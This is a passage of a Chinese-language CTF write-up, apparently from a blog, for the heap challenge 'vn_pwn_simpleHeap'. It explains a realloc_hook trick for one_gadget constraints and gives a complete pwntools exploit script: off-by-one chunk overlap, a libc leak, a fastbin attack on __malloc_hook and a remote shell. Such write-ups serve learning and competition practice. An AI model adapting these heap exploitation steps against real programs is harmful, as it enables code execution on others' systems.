但是这个题目在gadget的时候我们发现是有问题的，因为四个gadget的寄存器的条件我们均不满足，所以我们得借助__libc_realloc函数来调整寄存器的值，在__libc_realloc函数中会调用__realloc_hook函数，所以我们把one_gadget的位置打到__realloc_hook的位置，把__libc_realloc的地址打到__malloc_hook里面即可，令人兴奋的是，__realloc_hook的位置就在__malloc_hook的上方，这样我们的程序执行流程为，我们malloc---&gt;触发__malloc_hook---&gt;跳转到__libc_realloc调整寄存器---&gt;触发__realloc_hook---&gt;__realloc_hook是我们的one_gadget---&gt;get shell !!! __malloc_hook = fake_chunk_mem - 0x13 __realloc_hook = fake_chunk_mem - 0x13 - 0x5 漏洞利用 exp:（pwntools版本是python3的版本） from pwn import * local = 0 if local == 1: sh = process('./vn_pwn_simpleHeap') else: sh = remote('node3.buuoj.cn',28903) libc = ELF('./libc-2.23.so') elf = ELF('./vn_pwn_simpleHeap') def add(size,content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('size?',str(size)) sh.sendafter('content:',content) def edit(index,content): sh.sendlineafter('choice: ','2') sh.sendlineafter('idx?',str(index)) sh.sendafter('content',content) def show(index): sh.sendlineafter('choice: ','3') sh.sendlineafter('idx?',str(index)) def delete(index): sh.sendlineafter('choice: ','4') sh.sendlineafter('idx?',index) print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;) add(0x18,b'A'*0x18) #index 0 0x18 because we use the next chunk prevsize double using add(0x50,b'A') #index 1 add(0x60,b'A') #index 2 add(0x10,b'A') #index 3 to protect edit(0,b'A' * 0x18 + b'\\xd1') # off by one to change the &quot;index 1&quot; chunk's size print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;) delete('1') add(0x50,'B') show(2) #index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2 main_arena_88 = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) main_arena = main_arena_88 - 88 libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook'] #libc_base = __malloc_hook - __malloc_hook_offset print(hex(libc_base)) print(&quot;================================ 3: fastbin attack ---&gt; attack __malloc_hook-0x23 ================&quot;) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fake_chunk = malloc_hook - 0x23 print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!') add(0x60,b'A' * 16) #index 4 delete('2') print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################') print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;) edit(4,p64(fake_chunk)+b'\\n') one_gadget = libc_base + 0x4526a #one_gadget print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;) realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12 realloc_hook_1 = libc_base + 0x846CC print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;) print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;) payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\\n' add(0x60,'A') #index 2 which fd pointer point fake chunk add(0x60,payload) #index fake chunk print(&quot;============================== 4: one_gadget ===========================&quot;) sh.sendline('1') sh.sendline('32') sh.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"}]}